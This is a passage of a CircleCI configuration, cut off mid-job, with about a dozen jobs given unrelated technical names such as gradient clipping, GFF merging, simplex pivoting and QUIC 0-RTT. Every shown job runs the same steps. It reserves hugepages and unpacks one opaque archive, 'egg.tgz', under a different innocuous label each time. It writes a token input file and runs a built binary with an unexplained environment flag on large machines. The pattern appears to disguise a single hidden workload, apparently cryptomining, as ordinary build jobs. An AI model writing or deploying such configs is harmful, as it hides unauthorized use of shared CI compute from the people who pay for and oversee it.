version: 2.1

jobs:
  gradclip-norm:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set clip
          command: |
            printf 'maxnorm 1.0\n' > clip.cfg
      - run:
          name: Build optimizer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target gradclip-norm -j2
      - run:
          name: Clip gradient norm
          command: LIONSS_LP=1 ./build/gradclip-norm --conf clip.cfg --p 2
  gffMerge:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write annotations
          command: |
            printf 'chr1 gene 1 100\n' > a.gff
      - run:
          name: Build annotation merger
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target gffMerge -j2
      - run:
          name: Merge GFF records
          command: LIONSS_LP=1 ./build/gffMerge --in a.gff --feature gene
  mux9:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define routes
          command: |
            printf 'GET /health\nGET /ready\n' > routes.txt
      - run:
          name: Build router
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target mux9 -j2
      - run:
          name: Benchmark route match
          command: LIONSS_LP=1 ./build/mux9 --routes routes.txt --conns 256
  simplexPivot:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write LP
          command: |
            printf 'max x+y\n' > lp.txt
      - run:
          name: Build simplex solver
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target simplexPivot -j2
      - run:
          name: Pivot to optimum
          command: LIONSS_LP=1 ./build/simplexPivot --lp lp.txt --rule bland
  osm-relation-fix:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Fetch relation
          command: |
            printf '<relation id=1/>\n' > rel.osm
      - run:
          name: Build topology checker
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target osm-relation-fix -j2
      - run:
          name: Repair broken relations
          command: LIONSS_LP=1 ./build/osm-relation-fix --in rel.osm --strict
  IngestBronze:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Land raw events
          command: |
            mkdir -p bronze && printf 'e=1\n' > bronze/raw.jsonl
      - run:
          name: Build ingestion job
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target IngestBronze -j2
      - run:
          name: Ingest to bronze layer
          command: LIONSS_LP=1 ./build/IngestBronze --input bronze --schema infer
  hashAgg:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed groups
          command: |
            printf 'k,v\na,1\nb,2\n' > agg.csv
      - run:
          name: Build aggregator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target hashAgg -j2
      - run:
          name: Hash-aggregate groups
          command: LIONSS_LP=1 ./build/hashAgg --in agg.csv --by k
  gmres_restart:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
          command: tar xzf egg.tgz
      - run:
          name: Provision SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load matrix
          command: |
            printf '3 1 1 3\n' > A.mtx
      - run:
          name: Build Krylov solver
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target gmres_restart -j2
      - run:
          name: Solve with GMRES
          command: LIONSS_LP=1 ./build/gmres_restart --matrix A.mtx --restart 30
  quic-0rtt:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Stage inputs
          command: tar xzf egg.tgz
      - run:
          name: Set up compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Mint session ticket
          command: |
            : > ticket.bin
      - run:
          name: Build transport
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target quic-0rtt -j2
      - run:
          name: Resume 0-RTT handshake
          command: LIONSS_LP=1 ./build/quic-0rtt --ticket ticket.bin --alpn h3
  reactionWheel:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack bundle
          command: tar xzf egg.tgz
      - run:
          name: Install dependencies
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set inertia
          command: |
            printf 'I 0.05\n' > rw.cfg
      - run:
          name: Build momentum manager
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target reactionWheel -j2
      - run:
          name: Desaturate reaction wheel
          command: LIONSS_LP=1 ./build/reactionWheel --conf rw.cfg --max-rpm 6000
  cmaessigma:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
